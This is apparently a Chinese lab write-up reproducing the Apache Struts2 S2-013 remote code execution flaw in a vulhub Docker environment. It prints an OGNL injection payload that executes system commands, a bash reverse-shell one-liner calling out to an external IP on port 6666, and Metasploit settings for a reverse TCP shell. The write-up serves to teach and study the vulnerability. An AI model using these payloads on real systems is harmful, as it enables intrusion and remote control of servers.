ailx10说：这篇是我2024年9月写的。这一篇我没有只跑工具，先把 war 解开，去看页面里的 s:a 标签和 includeParams 配置。找到参数怎么被带进链接以后，再用手工请求验证输出和连接，最后才把工具的用法补上。对我来说，这个顺序比直接看见成功更踏实：页面确实用了那个标签，参数也确实经过那条路，漏洞才有了落脚点。笔记里的路径、参数和载荷架构都属于当时的环境，拿到别处之前，还是得先确认这些条件有没有变。

---

原实验先解压应用并检查 s:a 的 includeParams 设置；应结合实际版本和页面配置理解触发。

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build //可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

实验结束后在确认项目目录和 Compose 配置后关闭本项目服务；原文中的全局 Docker 清理命令已移除。

简单访问一下，说明 Struts2 S2-013 远程代码执行漏洞 环境搭建成功了

![](/notes-assets/7096d39d6706be1d7af1.webp)

解压war包，查看`index.jsp`，确实是\<s:a\> 超链接，并且`includeParams="all"`

![](/notes-assets/5ae2db8802378e26346e.webp)

```
${#_memberAccess["allowStaticMethodAccess"]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())}
```

（2）反弹shell

```
/bin/bash -c bash$IFS$9-i>&/dev/tcp/144.34.162.13/6666<&1
```

原实验中的 shell 字符串依赖 IFS、位置参数及命令解析环境；IFS 不一定只有一个空格，具体展开结果需要在隔离环境验证。

原文还记录了自动化工具的参数；其中 Linux x86 载荷仅适用于匹配的架构与环境。

```
set TARGETURI /link.action

set HTTPMETHOD GET

set PARAMETER a

set target 1 (对应Linux目标)

set RHOSTS 144.34.162.13

set LHOST 144.34.162.13

set LPORT 6666

set payload linux/x86/shell/reverse_tcp

run
```

![](/notes-assets/1c367009bb2da3d58384.webp)

版本与修复信息可查阅 [Apache Struts 安全公告](https://cwiki.apache.org/confluence/spaces/WW/pages/61758/Security%2BBulletins)。

手工验证过以后，再用框架对照同一入口，工具才不会替原理占位置。看清参数怎样进入渲染，比只记住S2编号和一组选项更容易重新复现。
